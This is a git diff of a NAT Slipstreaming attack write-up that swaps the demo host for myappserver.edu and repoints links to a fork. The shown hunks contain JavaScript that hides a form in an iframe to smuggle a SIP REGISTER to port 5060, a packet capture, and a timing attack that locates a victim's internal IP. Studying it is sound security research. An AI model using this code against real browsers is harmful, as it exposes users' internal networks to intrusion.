@@ -375,7 +375,7 @@ Now, in a quick test, sending a SIP REGISTER packet over port 5060 through an HT
 
 ```javascript
 // our sip message
-var sipmsg = 'REGISTER sip:samy.pl;transport=TCP SIP/2.0\r\n' +
+var sipmsg = 'REGISTER sip:myappserver.edu;transport=TCP SIP/2.0\r\n' +
              'Contact: <sip:samy@192.168.0.109:1234;transport=TCP>\r\n\r\n'
 
 // load form in an iframe so user doesn't see it
@@ -387,7 +387,7 @@ iframe.style.display = 'none' // hide the iframe
 var form = document.createElement('form')
 form.setAttribute('target', 'iframe') // load into iframe
 form.setAttribute('method', 'POST') // need the POST area where we can add CRLFs
-form.setAttribute('action', 'http://samy.pl:5060') // "http" server on SIP port 5060
+form.setAttribute('action', 'http://myappserver.edu:5060') // "http" server on SIP port 5060
 form.setAttribute('enctype', 'multipart/form-data') // ensure our data doesn't get encoded
 
 var textarea = document.createElement('textarea')
@@ -404,23 +404,23 @@ If we sniff, we see (parsed via [`h2b`](https://github.com/samyk/samytools/blob/
 ```sh
 $ unbuffer tcpdump -X port 5060 | h2b
 POST / HTTP/1.1
-Host: samy.pl:5060
+Host: myappserver.edu:5060
 Connection: keep-alive
 Content-Length: 191
 Cache-Control: max-age=0
-Origin: http://samy.pl
+Origin: http://myappserver.edu
 Upgrade-Insecure-Requests: 1
 Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryhcoAd2iSAx3TJA7A
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.66 Safari/537.36
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
-Referer: http://samy.pl/o/sp.html
+Referer: http://myappserver.edu/o/sp.html
 Accept-Encoding: gzip, deflate
 Accept-Language: en-US,en;q=0.9
 
 ------WebKitFormBoundaryhcoAd2iSAx3TJA7A
 Content-Disposition: form-data; name="textname"
 
-REGISTER sip:samy.pl;transport=TCP SIP/2.0
+REGISTER sip:myappserver.edu;transport=TCP SIP/2.0
 Contact: <sip:samy@192.168.0.109:1234;transport=TCP>
 
 
@@ -479,9 +479,9 @@ At a high level, we can't control the start of the TCP packet, but what if we se
 
 Well, we would need to know how much data the browser will send, which will be different per browser, and even by user as they may send different HTTP headers. HTTPS won't work as most of the content is encrypted, where an HTTP POST allows us to control a large portion of the header.
 
-To get the general size of the packet, we send a **large** (6000 byte) HTTP POST with an ID and padding data with a hidden web form to our http://our.attack.server:5060/pktsize. On the attack server, we run a [packet sniffer](https://github.com/samyk/slipstream/blob/main/max_pkt_size.pl) which looks for the boundaries of our packet to determine MTU (Maximum Transmission Unit) size, IP header size, potential IP options, TCP header size, potential TCP options, data packet size, and what portion of the packet we control.
+To get the general size of the packet, we send a **large** (6000 byte) HTTP POST with an ID and padding data with a hidden web form to our http://our.attack.server:5060/pktsize. On the attack server, we run a [packet sniffer](https://github.com/utfpr-cesc/slipstream/blob/main/max_pkt_size.pl) which looks for the boundaries of our packet to determine MTU (Maximum Transmission Unit) size, IP header size, potential IP options, TCP header size, potential TCP options, data packet size, and what portion of the packet we control.
 
-We also run a [custom server](https://github.com/samyk/slipstream/blob/main/serv-sip.pl) that listens on TCP port 5060, and responds with HTTP traffic to appease the browser so nothing looks fishy on the client side (a server with a malformed response would cause errors in the console, or an incorrectly responding server would keep the status spinner going).
+We also run a [custom server](https://github.com/utfpr-cesc/slipstream/blob/main/serv-sip.pl) that listens on TCP port 5060, and responds with HTTP traffic to appease the browser so nothing looks fishy on the client side (a server with a malformed response would cause errors in the console, or an incorrectly responding server would keep the status spinner going).
 
 ![POST large form to measure MTU and TCP data size](img/sniff2.png)
 
@@ -523,7 +523,7 @@ As of today, using WebRTC to get the local IP address on Chrome, rather than a `
 
 If using Safari, IE <= 11, or others that don't support WebRTC or intentionally don't reveal internal IP (Safari), we can use a web timing attack to reveal the victim's internal IP address.
 
-We manage this by first producing hidden HTML `<img>` tags on the page, all to common gateways (192.168.*.1, 10.0.0.1, and [others](https://github.com/samyk/slipstream/blob/main/server#L159)), along with Javascript `onsuccess` and `onerror` events. Each time an img is written to the page, a timer is started and if the `onsuccess` loads, that means the IP responded with a web server, and if no web server is running but the IP is on the network, it will send a TCP RST (reset, meaning port not open) back, triggering the `onerror`. If no IP exists, no RST is sent and the response will take > 1 second, at which point we know the IP doesn't exist on our network.
+We manage this by first producing hidden HTML `<img>` tags on the page, all to common gateways (192.168.*.1, 10.0.0.1, and [others](https://github.com/utfpr-cesc/slipstream/blob/main/server.php#L159)), along with Javascript `onsuccess` and `onerror` events. Each time an img is written to the page, a timer is started and if the `onsuccess` loads, that means the IP responded with a web server, and if no web server is running but the IP is on the network, it will send a TCP RST (reset, meaning port not open) back, triggering the `onerror`. If no IP exists, no RST is sent and the response will take > 1 second, at which point we know the IP doesn't exist on our network.
 
 Once we see one of these events trigger, we know a potential internal subnet we're on, then we perform the same attack for every IP on the subnet (eg, 192.168.0.[2-255]), and this time perform a more precise timing to determine which IP responds **fastest**. This is most likely our own (victim) internal IP, as we don't even need to leave the network interface. Even if we aren't first for some reason, we still attempt our attack on all IPs that responded on the network.
 
